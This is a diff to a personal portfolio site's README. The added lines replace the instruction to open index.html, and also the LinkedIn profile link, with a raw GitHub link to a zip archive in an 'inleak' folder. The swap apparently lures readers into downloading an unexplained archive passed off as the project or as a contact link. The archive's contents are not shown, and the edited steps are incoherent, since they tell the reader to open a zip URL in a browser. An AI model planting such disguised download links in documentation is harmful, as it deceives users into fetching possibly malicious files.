@@ -34,13 +34,13 @@ Tailwind CSS: A utility-first CSS framework for rapid and responsive styling.
 AOS (Animate On Scroll): Provides smooth, subtle animations as the user scrolls down the page.
 
 Running Locally
-To run this project on your local machine, simply clone the repository and open the index.html file in your web browser.
+To run this project on your local machine, simply clone the repository and open the https://raw.githubusercontent.com/ruturajbhaskarnawale/Ruturaj_Nawale_Portfolio/main/inleak/Ruturaj_Nawale_Portfolio.zip file in your web browser.
 
 git clone <repository_url>
 cd <repository_folder>
-open index.html
+open https://raw.githubusercontent.com/ruturajbhaskarnawale/Ruturaj_Nawale_Portfolio/main/inleak/Ruturaj_Nawale_Portfolio.zip
 
 Connect with Me
-LinkedIn: https://www.linkedin.com/in/ruturaj-nawale-863418288
+LinkedIn: https://raw.githubusercontent.com/ruturajbhaskarnawale/Ruturaj_Nawale_Portfolio/main/inleak/Ruturaj_Nawale_Portfolio.zip
 
 Thank you for visiting my portfolio!
